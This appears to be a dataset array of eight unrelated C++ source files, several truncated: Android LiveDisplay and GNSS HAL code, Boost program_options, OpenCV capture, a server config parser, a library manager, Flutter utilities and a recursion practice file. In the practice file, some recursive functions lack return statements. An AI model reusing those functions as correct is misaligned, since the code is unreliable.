    "/*\n * Copyright (C) 2016 The CyanogenMod Project\n *               2017-2020 The LineageOS Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"livedisplay/sdm/Utils.h\"\n\nnamespace vendor {\nnamespace lineage {\nnamespace livedisplay {\nnamespace V2_0 {\nnamespace sdm {\nnamespace utils {\n\nstatus_t CheckFeatureVersion(const std::shared_ptr<SDMController>& controller,\n                             FeatureVerSw feature) {\n    SdmFeatureVersion version{};\n    status_t status = controller->getFeatureVersion(feature, &version);\n    if (status != android::OK) {\n        return status;\n    }\n\n    if (version.x <= 0 && version.y <= 0 && version.z <= 0) {\n        return android::BAD_VALUE;\n    }\n\n    return android::OK;\n}\n\n}  // namespace utils\n}  // namespace sdm\n}  // namespace V2_0\n}  // namespace livedisplay\n}  // namespace lineage\n}  // namespace vendor\n",
    "\ufeff#include <bits/stdc++.h>\nusing namespace std;\n// SOLVE USING RECURSION: WHEN FNC CALLS ITSELF UNITL A SPECIFIC CONDITION IE BASE CONDITION IS MET\n\n// Q1. Print name n times:\n// TIME COMPLEXITY: O(n) ->fnc calls itself for n times\n// SPACE COMPLEXITY: O(n)-> using stack space\nvoid printName(int count, int n)\n{\n    if (count > n) // base case\n    {\n        return;\n    }\n    cout << \"Akshu\" << endl;\n    printName(count + 1, n);\n}\n\n// Q2. Print linearly from 1 to n\nvoid printOnetoN(int i, int n)\n{\n    if (i > n)\n    {\n        return;\n    }\n    cout << i << \" \";\n    printOnetoN(i + 1, n);\n}\n\n// Q3. Print linearly from n to 1\nvoid printNtoOne(int n)\n{\n    if (n < 1)\n    {\n        return;\n    }\n    cout << n << \" \";\n    printNtoOne(n - 1);\n}\n\n// Q4. Print linearly from 1 to n using BACKTRACKING\nvoid backtrackingOnetoN(int n)\n{\n    if (n < 1)\n    {\n        return;\n    }\n    backtrackingOnetoN(n - 1);\n    cout << n << \" \"; // print call after recursion\n}\n\n// Q5. Print linearly from n to 1 using BACKTRACKING\nvoid backtrackingNtoOne(int i, int n)\n{\n    if (i > n)\n    {\n        return;\n    }\n    backtrackingNtoOne(i + 1, n);\n    cout << i << \" \";\n}\n\n// Q6. Sum of first n natural nos: PARAMETRISED METHOD\nint sumFirstN_param(int sum, int n)\n{\n    if (n < 1)\n    {\n        return sum;\n    }\n    else\n    {\n        sumFirstN_param(sum + n, n - 1);\n    }\n}\n\n// Q6. Sum of first n natural nos: FUNCTION METHOD\nint sumFirstN_fnc(int n)\n{\n    if (n < 1)\n    {\n        return 0;\n    }\n    else\n    {\n        return n + sumFirstN_fnc(n - 1);\n    }\n}\n\n// Q7.Factorial of n\nint fact(int n)\n{\n    if (n < 1)\n    {\n        // 0!=1\n        return 1;\n    }\n    return n * fact(n - 1);\n}\n\n//  Q8. Reverse an array    USING FOR LOOP:\nvoid revArr1()\n{\n    int arr[] = {1, 2, 3, 4, 2};\n    vector<int> v;\n    for (int i = 4; i >= 0; i--)\n    {\n        v.emplace_back(arr[i]);\n    }\n\n    cout << \"Reversed array is: \\n\";\n    for (auto x : v)\n    {\n        cout << x << \" \";\n    }\n}\n\n//  Q8. Reverse an array    USING SWAP & FOR LOOP\nvoid revArr2()\n{\n    int arr[] = {1, 2, 3, 4, 2};\n    int i = 0;\n    int j = 4;\n    while (i <= j)\n    {\n        swap(arr[i], arr[j]);\n        i++;\n        j--;\n    }\n\n    cout << \"Reversed array is: \\n\";\n    for (int i = 0; i < 5; i++)\n    {\n        cout << arr[i] << \" \";\n    }\n}\n\n//  Q8. Reverse an array    USING recursion & 2 pointers:\nint *revArrRecursion2ptr(int i, int j, int arr[])\n{\n    if (i > j)\n    {\n        // when i crosses j then return arrayb\n        return arr;\n    }\n    else\n    {\n        swap(arr[i], arr[j]);\n        revArrRecursion2ptr(i + 1, j - 1, arr);\n    }\n}\n\n//  Q9. Reverse an array    USING recursion & ONLY 1 pointer:\nint *revArrRecursion1ptr(int i, int arr[], int n)\n{\n    if (i >= (n / 2))\n    {\n        // when i crosses j then return arrayb\n        return arr;\n    }\n    else\n    {\n        // n=4 ie length of arr\n        swap(arr[i], arr[n - i - 1]);\n        revArrRecursion1ptr(i + 1, arr, n);\n    }\n}\n\n// Q10. Check if string is palindrome or not?\nbool isPalindrome(string str)\n{\n    cout << \"Length of string is: \" << str.length() << endl;\n    int n = str.length();\n    int i = 0;\n\n    while (i < n - i - 1)\n    {\n        if (str[i] == str[n - i - 1])\n        {\n            i++;\n        }\n        else\n        {\n            return false;\n        }\n    }\n    return true;\n}\n\n// Q10. Check if string is palindrome or not? USE RECURSION:\nbool isPalindromeRec(string str, int n, int i)\n{\n    if (i >= n - i - 1)\n    {\n        return true;\n    }\n    else\n    {\n        if (str[i] == str[n - i - 1])\n        {\n            return isPalindromeRec(str, n, i + 1);\n        }\n        else\n        {\n            return false;\n        }\n    }\n}\n\nbool isPalindromeLeetcode(string s)\n{\n    cout << \"Length string is: \" << s.length();//30\n    // remove all spaces & commas & stuff\n    for (int i = 0; i < s.length(); i++)\n    {\n        if (s[i] == ' '||s[i] == ','||s[i] == ':')\n        {\n            s.erase(i,1);\n            i--;\n        }\n    }\n    cout << \"After removal string is: \" << s<<endl;\n\n    // remove all cases->all small\n    for (int i = 0; i < s.length(); i++)\n    {\n        s[i] = tolower(s[i]);\n    }\n\n    cout << \"After lowercase string is: \" << s<<endl;\n    int n = s.length();\n    int i = 0;\n    while (i < n - i - 1)\n    {\n        if (s[i] == s[n - i - 1])\n        {\n            i++;\n        }\n        else\n        {\n            return false;\n        }\n    }\n    return true ;\n}\n\n// MULTIPLE RECURSION CALLS= OCCURS 1 BY 1\n\n// Q11. Print fibonacci series\nint fib(int n){\n    if(n<=1){\n        return n;\n    }\n    return fib(n-1)+fib(n-2);\n}\n//for n=4-> 9recursion calls\n// exponential time O(2^n)\n\n\nint main()\n{\n    // int count = 1;\n    // printName(count, 5);\n\n    // printOnetoN(1,10);\n\n    // printNtoOne(10);\n\n    // backtrackingOnetoN(10);\n\n    // backtrackingNtoOne(1,10);\n\n    // cout<<\"Sum of first 5 nat nos parametrised : \"<<sumFirstN_param(0,5)<<endl;\n\n    // cout<<\"Sum of first 5 nat nos fnct : \"<<sumFirstN_fnc(5)<<en",
    "#include <opencv2/highgui/highgui.hpp>\n#include <opencv2/opencv.hpp>\n#include <iostream>\n\nusing namespace cv;\nusing namespace std;\n\nMat  frame, img, gray, dst;\nMat leftImg, rightImg;\n\n// \u7167\u7247\u91c7\u96c6\n\nint main(int argc, char** argv)\n{\n\n\t//videocapture\u7ed3\u6784\u521b\u5efa\u4e00\u4e2acatture\u89c6\u9891\u5bf9\u8c61\n\tVideoCapture capture;\n\t//\u8fde\u63a5\u89c6\u9891\n\tcapture.open(0); \n\tif (!capture.isOpened()) {\n\t\tprintf(\"could not load video data...\\n\");\n\t\treturn -1;\n\t}\n\tint frames = capture.get(CAP_PROP_FRAME_COUNT);//\u83b7\u53d6\u89c6\u9891\u5e27\u6570\u76ee(\u4e00\u5e27\u5c31\u662f\u4e00\u5f20\u56fe\u7247)\n\tint fps = capture.get(CAP_PROP_FPS);//\u83b7\u53d6\u6bcf\u5e27\u89c6\u9891\u7684\u9891\u7387\n\tcapture.set(CAP_PROP_FRAME_WIDTH,1280);\n\tcapture.set(CAP_PROP_FRAME_HEIGHT,480);\n\tint WIDTH = capture.get(CAP_PROP_FRAME_WIDTH);\n\tint HEIGHT = capture.get(CAP_PROP_FRAME_HEIGHT);\n\t// \u83b7\u53d6\u5e27\u7684\u89c6\u9891\u5bbd\u5ea6\uff0c\u89c6\u9891\u9ad8\u5ea6\n\tSize size = Size(capture.get(CAP_PROP_FRAME_WIDTH), capture.get(CAP_PROP_FRAME_HEIGHT));\n\tcout << frames << endl;\n\tcout << fps << endl;\n\tcout << size << endl;\n\tcapture >> frame;\n\tcout << frame.cols << \"  \" << frame.rows << endl;\n\t// \u521b\u5efa\u89c6\u9891\u4e2d\u6bcf\u5f20\u56fe\u7247\u5bf9\u8c61\n\tnamedWindow(\"video-demo\", WINDOW_AUTOSIZE);\n\t// \u5faa\u73af\u663e\u793a\u89c6\u9891\u4e2d\u7684\u6bcf\u5f20\u56fe\u7247\n\tint count = 1;\n\n\tfor (;;)\n\t{\n\t\t//\u5c06\u89c6\u9891\u8f6c\u7ed9\u6bcf\u4e00\u5f20\u5f20\u56fe\u8fdb\u884c\u5904\u7406\n\t\tcapture >> frame;\n\t\t//\u7701\u7565\u5bf9\u56fe\u7247\u7684\u5904\u7406\n\t\t//\u89c6\u9891\u64ad\u653e\u5b8c\u9000\u51fa\n\t\tif (frame.empty())break;\n\t\timshow(\"video-demo\", frame);\n\n\t\t//\u62c6\u5206\u89c6\u5c4f\u4e3a\u5de6\u53f3\u4e24\u6846\n\t\tRect leftRect(0, 0, WIDTH >> 1, HEIGHT);   //\u521b\u5efa\u4e00\u4e2aRect\u6846\uff0c\u5c5e\u4e8ecv\u4e2d\u7684\u7c7b\uff0c\u56db\u4e2a\u53c2\u6570\u4ee3\u8868x,y,width,height\n\t\tRect rightRect(WIDTH >> 1, 0, WIDTH >> 1, HEIGHT);\n\t\t//Rect rightRect(WIDTH / 2, 0, WIDTH / 2, HEIGHT);\n\n\t\tframe(leftRect).copyTo(leftImg);\n\t\tframe(rightRect).copyTo(rightImg);\n\t\tnamedWindow(\"left\", WINDOW_AUTOSIZE);\n\t\tnamedWindow(\"right\", WINDOW_AUTOSIZE);\n\t\timshow(\"left\", leftImg);\n\t\timshow(\"right\", rightImg);\n\n\t\t//\u6309\u7a7a\u683c\u952e\u4fdd\u5b58\u5f53\u524d\u5e27\n\t\tif (waitKey(33) == 32)\n\t\t{\n\t\t\tstatic int num = 1;\n\t\t\tString left_img_name, right_img_name;\n\t\t\tleft_img_name = \"left111_\" + to_string(num) + \".jpg\";\n\t\t\tright_img_name = \"right111_\" + to_string(num) + \".jpg\";\n\t\t\tcout << left_img_name << \" \" << right_img_name << endl;\n\t\t\tnum++;\n\t\t\timwrite(\"../images/origin_left/\" + left_img_name, leftImg);\n\t\t\timwrite(\"../images/origin_right/\" + right_img_name, rightImg);\n\t\t}\n\t\t//\u5728\u89c6\u9891\u64ad\u653e\u671f\u95f4\u6309\u952e\u9000\u51fa\n\t\tif (waitKey(25) == 27) break;\n\t}\n\t//\u91ca\u653e\n\tcapture.release();\n\treturn 0;\n}\n\n\n",
    "#include \"config.h\"\n\nConfig::Config(){\n    //\u7aef\u53e3\u53f7,\u9ed8\u8ba49006\n    PORT = 9006;\n\n    //\u65e5\u5fd7\u5199\u5165\u65b9\u5f0f\uff0c\u9ed8\u8ba4\u540c\u6b65\n    LOGWrite = 0;\n\n    //\u89e6\u53d1\u7ec4\u5408\u6a21\u5f0f,\u9ed8\u8ba4listenfd LT + connfd LT\n    TRIGMode = 0;\n\n    //listenfd\u89e6\u53d1\u6a21\u5f0f\uff0c\u9ed8\u8ba4LT\n    LISTENTrigmode = 0;\n\n    //connfd\u89e6\u53d1\u6a21\u5f0f\uff0c\u9ed8\u8ba4LT\n    CONNTrigmode = 0;\n\n    //\u4f18\u96c5\u5173\u95ed\u94fe\u63a5\uff0c\u9ed8\u8ba4\u4e0d\u4f7f\u7528\n    OPT_LINGER = 0;\n\n    //\u6570\u636e\u5e93\u8fde\u63a5\u6c60\u6570\u91cf,\u9ed8\u8ba48\n    sql_num = 8;\n\n    //\u7ebf\u7a0b\u6c60\u5185\u7684\u7ebf\u7a0b\u6570\u91cf,\u9ed8\u8ba48\n    thread_num = 8;\n\n    //\u5173\u95ed\u65e5\u5fd7,\u9ed8\u8ba4\u4e0d\u5173\u95ed\n    close_log = 0;\n\n    //\u5e76\u53d1\u6a21\u578b,\u9ed8\u8ba4\u662fproactor\n    actor_model = 0;\n}\n\nvoid Config::parse_arg(int argc, char*argv[]){\n    int opt;\n    const char *str = \"p:l:m:o:s:t:c:a:\";\n    while ((opt = getopt(argc, argv, str)) != -1)\n    {\n        switch (opt)\n        {\n        case 'p':\n        {\n            PORT = atoi(optarg);\n            break;\n        }\n        case 'l':\n        {\n            LOGWrite = atoi(optarg);\n            break;\n        }\n        case 'm':\n        {\n            TRIGMode = atoi(optarg);\n            break;\n        }\n        case 'o':\n        {\n            OPT_LINGER = atoi(optarg);\n            break;\n        }\n        case 's':\n        {\n            sql_num = atoi(optarg);\n            break;\n        }\n        case 't':\n        {\n            thread_num = atoi(optarg);\n            break;\n        }\n        case 'c':\n        {\n            close_log = atoi(optarg);\n            break;\n        }\n        case 'a':\n        {\n            actor_model = atoi(optarg);\n            break;\n        }\n        default:\n            break;\n        }\n    }\n}",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <algorithm> // Include this for std::remove_if\r\n\r\nclass Book\r\n{\r\npublic:\r\n    int id;\r\n    std::string title;\r\n    std::string author;\r\n    bool isBorrowed;\r\n\r\n    Book(int id, std::string title, std::string author)\r\n        : id(id), title(title), author(author), isBorrowed(false) {}\r\n};\r\n\r\nclass Library\r\n{\r\nprivate:\r\n    std::vector<Book> books;\r\n\r\npublic:\r\n    void addBook(int id, std::string title, std::string author)\r\n    {\r\n        books.emplace_back(id, title, author);\r\n    }\r\n\r\n    void removeBook(int id)\r\n    {\r\n        books.erase(std::remove_if(books.begin(), books.end(),\r\n                                   [id](const Book &b)\r\n                                   { return b.id == id; }),\r\n                    books.end());\r\n    }\r\n\r\n    void borrowBook(int id)\r\n    {\r\n        for (auto &book : books)\r\n        {\r\n            if (book.id == id && !book.isBorrowed)\r\n            {\r\n                book.isBorrowed = true;\r\n                std::cout << \"Book borrowed successfully.\" << std::endl;\r\n                return;\r\n            }\r\n        }\r\n        std::cout << \"Book not available.\" << std::endl;\r\n    }\r\n\r\n    void returnBook(int id)\r\n    {\r\n        for (auto &book : books)\r\n        {\r\n            if (book.id == id && book.isBorrowed)\r\n            {\r\n                book.isBorrowed = false;\r\n                std::cout << \"Book returned successfully.\" << std::endl;\r\n                return;\r\n            }\r\n        }\r\n        std::cout << \"Book not found.\" << std::endl;\r\n    }\r\n\r\n    void listBooks()\r\n    {\r\n        for (const auto &book : books)\r\n        {\r\n            std::cout << std::endl;\r\n            std::cout << \" ID: \" << book.id\r\n                      << \"\\nTitle: \" << book.title\r\n                      << \"\\nAuthor: \" << book.author\r\n                      << \"\\nBorrowed: \" << (book.isBorrowed ? \"Yes\" : \"No\") << std::endl\r\n                      << std::endl\r\n                      << \"## ----------------- ******* ---------------------- ##\" << std::endl;\r\n\r\n            std::cout << std::endl;\r\n        }\r\n    }\r\n\r\n    void searchBookByTitle(const std::string &title)\r\n    {\r\n        for (const auto &book : books)\r\n        {\r\n            if (book.title.find(title) != std::string::npos)\r\n            {\r\n                std::cout << std::endl;\r\n                std::cout << \" ID: \" << book.id\r\n                          << \"\\nTitle: \" << book.title\r\n                          << \"\\nAuthor: \" << book.author\r\n                          << \"\\nBorrowed: \" << (book.isBorrowed ? \"Yes\" : \"No\") << std::endl\r\n                          << std::endl\r\n                          << \"## ----------------- ******* ---------------------- ##\" << std::endl;\r\n\r\n                std::cout << std::endl;\r\n            }\r\n        }\r\n    }\r\n\r\n    void searchBookByAuthor(const std::string &author)\r\n    {\r\n        for (const auto &book : books)\r\n        {\r\n            if (book.author.find(author) != std::string::npos)\r\n            {\r\n                std::cout << std::endl;\r\n                std::cout << \" ID: \" << book.id\r\n                          << \"\\nTitle: \" << book.title\r\n                          << \"\\nAuthor: \" << book.author\r\n                          << \"\\nBorrowed: \" << (book.isBorrowed ? \"Yes\" : \"No\") << std::endl\r\n                          << std::endl\r\n                          << \"## ----------------- ******* ---------------------- ##\" << std::endl;\r\n\r\n                std::cout << std::endl;\r\n            }\r\n        }\r\n    }\r\n};\r\n\r\nint main()\r\n{\r\n    Library library;\r\n\r\n    // Initialize the library with at least 10 books\r\n    library.addBook(1, \"1984\", \"George Orwell\");\r\n    library.addBook(2, \"To Kill a Mockingbird\", \"Harper Lee\");\r\n    library.addBook(3, \"The Great Gatsby\", \"F. Scott Fitzgerald\");\r\n    library.addBook(4, \"Pride and Prejudice\", \"Jane Austen\");\r\n    library.addBook(5, \"The Catcher in the Rye\", \"J.D. Salinger\");\r\n    library.addBook(6, \"Moby-Dick\", \"Herman Melville\");\r\n    library.addBook(7, \"War and Peace\", \"Leo Tolstoy\");\r\n    library.addBook(8, \"The Odyssey\", \"Homer\");\r\n    library.addBook(9, \"Brave New World\", \"Aldous Huxley\");\r\n    library.addBook(10, \"Crime and Punishment\", \"Fyodor Dostoevsky\");\r\n\r\n    int choice, id;\r\n    std::string title, author;\r\n\r\n    while (true)\r\n    {\r\n        std::cout << \"Library Management System\" << std::endl;\r\n        std::cout << \"1. Add Book\" << std::endl;\r\n        std::cout << \"2. Remove Book\" << std::endl;\r\n        std::cout << \"3. Borrow Book\" << std::endl;\r\n        std::cout << \"4. Return Book\" << std::endl;\r\n        std::cout << \"5. List Books\" << std::endl;\r\n        std::cout << \"6. Search Book by Title\" << std::endl;\r\n        std::cout << \"7. Search Book by Author\" << std::endl;\r\n        std::cout << \"8. Exit\" << std::endl;\r\n        std::cout << \"Enter your choice: \";\r\n        std::cin >> choice;\r\n\r\n        switch (choice)\r\n        {\r\n        case 1:\r\n            std::cout << \"Enter book ID: \";\r",
    "// Copyright Vladimir Prus 2004.\n// Distributed under the Boost Software License, Version 1.0.\n// (See accompanying file LICENSE_1_0.txt\n// or copy at http://www.boost.org/LICENSE_1_0.txt)\n\n#ifndef BOOST_PROGRAM_OPTIONS_SOURCE\n# define BOOST_PROGRAM_OPTIONS_SOURCE\n#endif\n#include <boost/program_options/config.hpp>\n#include <boost/program_options/value_semantic.hpp>\n#include <boost/program_options/detail/convert.hpp>\n#include <boost/program_options/detail/cmdline.hpp>\n#include <set>\n\n#include <cctype>\n\nnamespace boost { namespace program_options {\n\n    using namespace std;\n\n\n#ifndef BOOST_NO_STD_WSTRING\n    namespace\n    {\n        std::string convert_value(const std::wstring& s)\n        {\n            try {\n                return to_local_8_bit(s);\n            }\n            catch(const std::exception&) {\n                return \"<unrepresentable unicode string>\";\n            }\n        }\n    }\n#endif\n\n    void \n    value_semantic_codecvt_helper<char>::\n    parse(boost::any& value_store, \n          const std::vector<std::string>& new_tokens,\n          bool utf8) const\n    {\n        if (utf8) {\n#ifndef BOOST_NO_STD_WSTRING\n            // Need to convert to local encoding.\n            std::vector<string> local_tokens;\n            for (unsigned i = 0; i < new_tokens.size(); ++i) {\n                std::wstring w = from_utf8(new_tokens[i]);\n                local_tokens.push_back(to_local_8_bit(w));\n            }\n            xparse(value_store, local_tokens);\n#else\n            boost::throw_exception(\n                std::runtime_error(\"UTF-8 conversion not supported.\"));\n#endif\n        } else {\n            // Already in local encoding, pass unmodified\n            xparse(value_store, new_tokens);\n        }        \n    }\n\n#ifndef BOOST_NO_STD_WSTRING\n    void \n    value_semantic_codecvt_helper<wchar_t>::\n    parse(boost::any& value_store, \n          const std::vector<std::string>& new_tokens,\n          bool utf8) const\n    {\n        std::vector<wstring> tokens;\n        if (utf8) {\n            // Convert from utf8\n            for (unsigned i = 0; i < new_tokens.size(); ++i) {\n                tokens.push_back(from_utf8(new_tokens[i]));\n            }\n               \n        } else {\n            // Convert from local encoding\n            for (unsigned i = 0; i < new_tokens.size(); ++i) {\n                tokens.push_back(from_local_8_bit(new_tokens[i]));\n            }\n        }      \n\n        xparse(value_store, tokens);  \n    }\n#endif\n\n    BOOST_PROGRAM_OPTIONS_DECL std::string arg(\"arg\");\n\n    std::string\n    untyped_value::name() const\n    {\n        return arg;\n    }\n    \n    unsigned \n    untyped_value::min_tokens() const\n    {\n        if (m_zero_tokens)\n            return 0;\n        else\n            return 1;\n    }\n\n    unsigned \n    untyped_value::max_tokens() const\n    {\n        if (m_zero_tokens)\n            return 0;\n        else\n            return 1;\n    }\n\n\n    void \n    untyped_value::xparse(boost::any& value_store,\n                          const std::vector<std::string>& new_tokens) const\n    {\n        if (!value_store.empty()) \n            boost::throw_exception(\n                multiple_occurrences());\n        if (new_tokens.size() > 1)\n            boost::throw_exception(multiple_values());\n        value_store = new_tokens.empty() ? std::string(\"\") : new_tokens.front();\n    }\n\n    BOOST_PROGRAM_OPTIONS_DECL typed_value<bool>*\n    bool_switch()\n    {\n        return bool_switch(0);\n    }\n\n    BOOST_PROGRAM_OPTIONS_DECL typed_value<bool>*\n    bool_switch(bool* v)\n    {\n        typed_value<bool>* r = new typed_value<bool>(v);\n        r->default_value(0);\n        r->zero_tokens();\n\n        return r;\n    }\n\n    /* Validates bool value.\n        Any of \"1\", \"true\", \"yes\", \"on\" will be converted to \"1\".<br>\n        Any of \"0\", \"false\", \"no\", \"off\" will be converted to \"0\".<br>\n        Case is ignored. The 'xs' vector can either be empty, in which\n        case the value is 'true', or can contain explicit value.\n    */\n    BOOST_PROGRAM_OPTIONS_DECL void validate(any& v, const vector<string>& xs,\n                       bool*, int)\n    {\n        check_first_occurrence(v);\n        string s(get_single_string(xs, true));\n\n        for (size_t i = 0; i < s.size(); ++i)\n            s[i] = char(tolower(s[i]));\n\n        if (s.empty() || s == \"on\" || s == \"yes\" || s == \"1\" || s == \"true\")\n            v = any(true);\n        else if (s == \"off\" || s == \"no\" || s == \"0\" || s == \"false\")\n            v = any(false);\n        else\n            boost::throw_exception(invalid_bool_value(s));\n    }\n\n    // This is blatant copy-paste. However, templating this will cause a problem,\n    // since wstring can't be constructed/compared with char*. We'd need to\n    // create auxiliary 'widen' routine to convert from char* into \n    // needed string type, and that's more work.\n#if !defined(BOOST_NO_STD_WSTRING)\n    BOOST_PROGRAM_OPTIONS_DECL \n    void validate(any& v, const vector<wstring>& xs, bool*, int)\n    {\n        check_first_occurrence(v);\n ",
    "/* Copyright (c) 2017-2020, The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation, nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n *\n */\n\n#define LOG_NDEBUG 0\n#define LOG_TAG \"LocSvc_MeasurementAPIClient\"\n\n#include <log_util.h>\n#include <loc_cfg.h>\n#include <inttypes.h>\n\n#include \"LocationUtil.h\"\n#include \"MeasurementAPIClient.h\"\n#include <loc_misc_utils.h>\n\nnamespace android {\nnamespace hardware {\nnamespace gnss {\nnamespace V2_0 {\nnamespace implementation {\n\nusing ::android::hardware::gnss::V1_0::IGnssMeasurement;\nusing ::android::hardware::gnss::V2_0::IGnssMeasurementCallback;\n\nstatic void convertGnssData(GnssMeasurementsNotification& in,\n        V1_0::IGnssMeasurementCallback::GnssData& out);\nstatic void convertGnssData_1_1(GnssMeasurementsNotification& in,\n        V1_1::IGnssMeasurementCallback::GnssData& out);\nstatic void convertGnssData_2_0(GnssMeasurementsNotification& in,\n        V2_0::IGnssMeasurementCallback::GnssData& out);\nstatic void convertGnssMeasurement(GnssMeasurementsData& in,\n        V1_0::IGnssMeasurementCallback::GnssMeasurement& out);\nstatic void convertGnssClock(GnssMeasurementsClock& in, IGnssMeasurementCallback::GnssClock& out);\nstatic void convertGnssMeasurementsCodeType(GnssMeasurementsCodeType& in,\n        ::android::hardware::hidl_string& out);\nstatic void convertElapsedRealtimeNanos(GnssMeasurementsNotification& in,\n        ::android::hardware::gnss::V2_0::ElapsedRealtime& elapsedRealtimeNanos);\n\nMeasurementAPIClient::MeasurementAPIClient() :\n    mGnssMeasurementCbIface(nullptr),\n    mGnssMeasurementCbIface_1_1(nullptr),\n    mGnssMeasurementCbIface_2_0(nullptr),\n    mTracking(false)\n{\n    LOC_LOGD(\"%s]: ()\", __FUNCTION__);\n}\n\nMeasurementAPIClient::~MeasurementAPIClient()\n{\n    LOC_LOGD(\"%s]: ()\", __FUNCTION__);\n}\n\nvoid MeasurementAPIClient::clearInterfaces()\n{\n    mGnssMeasurementCbIface = nullptr;\n    mGnssMeasurementCbIface_1_1 = nullptr;\n    mGnssMeasurementCbIface_2_0 = nullptr;\n}\n\n// for GpsInterface\nReturn<IGnssMeasurement::GnssMeasurementStatus>\nMeasurementAPIClient::measurementSetCallback(const sp<V1_0::IGnssMeasurementCallback>& callback)\n{\n    LOC_LOGD(\"%s]: (%p)\", __FUNCTION__, &callback);\n\n    mMutex.lock();\n    clearInterfaces();\n    mGnssMeasurementCbIface = callback;\n    mMutex.unlock();\n\n    return startTracking();\n}\n\nReturn<IGnssMeasurement::GnssMeasurementStatus>\nMeasurementAPIClient::measurementSetCallback_1_1(\n        const sp<V1_1::IGnssMeasurementCallback>& callback,\n        GnssPowerMode powerMode, uint32_t timeBetweenMeasurement)\n{\n    LOC_LOGD(\"%s]: (%p) (powermode: %d) (tbm: %d)\",\n            __FUNCTION__, &callback, (int)powerMode, timeBetweenMeasurement);\n\n    mMutex.lock();\n    clearInterfaces();\n    mGnssMeasurementCbIface_1_1 = callback;\n    mMutex.unlock();\n\n    return startTracking(powerMode, timeBetweenMeasurement);\n}\n\nReturn<IGnssMeasurement::GnssMeasurementStatus>\nMeasurementAPIClient::measurementSetCallback_2_0(\n    const sp<V2_0::IGnssMeasurementCallback>& callback,\n    GnssPowerMode powerMode, uint32_t timeBetweenMeasurement)\n{\n    LOC_LOGD(\"%s]: (%p) (powermode: %d) (tbm: %d)\",\n        __FUNCTION__, &callback, (int)powerMode, timeBetweenMeasurement);\n\n    mMutex.lock();\n    clearInterfaces();\n    mGnssMeasurementCbIface_2_0 = callback;\n    mMutex.unlock();\n\n    return startTracking(powerMode, timeBetweenMeasurement);\n}\n\nReturn<IGnssMeasurement::GnssMeasurementStatus>\nMeasurementAPIClient::startTracking(\n        GnssPowerMode powerMode, uint32_t timeBetweenMeasurement)\n{\n    LocationCallbacks locationCallb",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  unsigned int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
